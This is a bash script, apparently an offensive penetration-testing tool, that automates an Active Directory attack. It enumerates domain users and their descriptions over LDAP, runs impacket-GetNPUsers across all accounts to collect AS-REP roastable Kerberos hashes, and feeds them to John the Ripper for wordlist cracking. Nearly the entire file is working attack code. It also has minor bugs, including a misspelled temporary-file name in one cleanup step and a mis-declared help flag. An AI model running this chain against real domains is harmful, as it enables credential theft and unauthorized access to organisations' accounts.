#!/bin/bash

show_help() {
  echo "-i > insert IP address"
  echo "-u > insert username found in the domain"
  echo "-p > insert password found in the domain"
  echo "-s > insert second level domain"
  echo "-d > insert top level domain"
  echo "-f > insert the name of the file for all the SamAccountNames"
  echo "-D > insert the the of the file for all the Descriptions + SamAccountNames"
  echo "-G > insert the name of the file for all the Groups + User Names"
exit 1
}

while getopts "i:u:p:s:d:h:f:G:D:" opt; do
  case "$opt" in
    i)
      ip=$OPTARG
      ;;
    u)
      username=$OPTARG
      ;;
    p)
      password=$OPTARG
      ;;
    s)
      sec_lvl_domain=$OPTARG
      ;;
    d)
      domain=$OPTARG
      ;;
    f)
      file_name=$OPTARG
      ;;
    D)
      desc_file=$OPTARG
      ;;
    G)
      grp_file=$OPTARG
      ;;
    h)
      show_help
      ;;
    *)
      echo "Invalid option: -$OPTARG" >&2
      show_help
      ;;
  esac
done

# Will take all the SamAccountNames and will put it a file.
# Will show all descriptions and usernames of the users.

if [ -z "$username" ] || [ -z "$password" ]; then

        ldapsearch -x -LLL -H ldap://$ip/ -b "dc=$sec_lvl_domain,dc=$domain" "(objectclass=user)" samaccountname | grep -i samaccountname | cut -d " " -f 2 > $file_name
        ldapsearch -x -LLL -H ldap://$ip/ -b "dc=$sec_lvl_domain,dc=$domain" "(&(objectclass=user)(description=*))" description samaccountname > $desc_file
        ldapsearch -x -LLL -H ldap://$ip/ -b "dc=$sec_lvl_domain,dc=$domain" "(objectclass=user)" > $grp_file
        read -p "Do you want to check for 'PRE_AUTH' on all the users? (yes/no) > " answer
        if [ $answer == "yes" ]; then

                echo "checking for users with 'PRE_AUTH' disabled"
                echo ""
                while read file; do impacket-GetNPUsers -no-pass -dc-ip $ip -format john $sec_lvl_domain.$domain/$file; done < $file_name > pre_auth_check.txt
                read -p "give a file name for all the hashes found > " hash_file
                cat pre_auth_check.txt | grep -i -E @ > $hash_file
                hash=$(cat $hash_file)
                if [ -z $hash ]; then
                        echo "no 'PRE_AUTH' enabled"
                        rm pre_auth_check.txt
                else
                        rm pre_auth_check.txt
                        echo ""
                        read -p "We have found some hashes for you to crack :D, Do you want to use JTR to crack it? (yes/no) > " answer
                        if [ $answer == "yes" ]; then
                                read -p "Enter the path to the word list on which we will use to crack the hash > " wordlist
                                john $hash_file --wordlist=$wordlist
                        fi
                fi

        elif [ $answer == "no" ]; then
                exit 1

        fi
else
        ldapsearch -x -LLL -H ldap://$ip/ -D "$username" -w "$password" -b "dc=$sec_lvl_domain,dc=$domain" "(objectclass=user)" samaccountname | grep -i samaccountname | cut -d " " -f 2 > $file_name
        ldapsearch -x -LLL -H ldap://$ip/ -D "$username" -w "$password" -b "dc=$sec_lvl_domain,dc=$domain" "(&(objectclass=user)(description=*))" description samaccountname > $desc_file
        ldapsearch -x -LLL -H ldap://$ip/ -D "$username" -w "$password" -b "dc=$sec_lvl_domain,dc=$domain" "(objectclass=user)" > $grp_file
        read -p "Do you want to check for 'PRE_AUTH' on all the users? (yes/no) > " answer
        if [ $answer == "yes" ]; then

                echo "checking for users with 'PRE_AUTH' disabled"
                echo ""
                while read file; do impacket-GetNPUsers -no-pass -dc-ip $ip -format john $sec_lvl_domain.$domain/$file; done < $file_name > pre_auth_check.txt
                read -p "give a file name for all the hashes found > " hash_file
                cat pre_auth_check.txt | grep -i -E @ > $hash_file
                hash=$(cat $hash_file)
                if [ -z $hash ]; then
                        echo "no 'PRE_AUTH' enabled"
                        rm pre_auth_check.txt
                else
                        rm pre_aut_check.txt
                        echo ""
                        read -p "We have found some hashes for you to crack :D, Do you want to use JTR to crack it? (yes/no) > " answer
                        if [ $answer == "yes" ]; then
                                read -p "Enter the path to the word list on which we will use to crack the hash > " wordlist
                                john $hash_file --wordlist=$wordlist
                        fi
                fi
        elif [ $answer == "no" ]; then
                exit 1

        fi
fi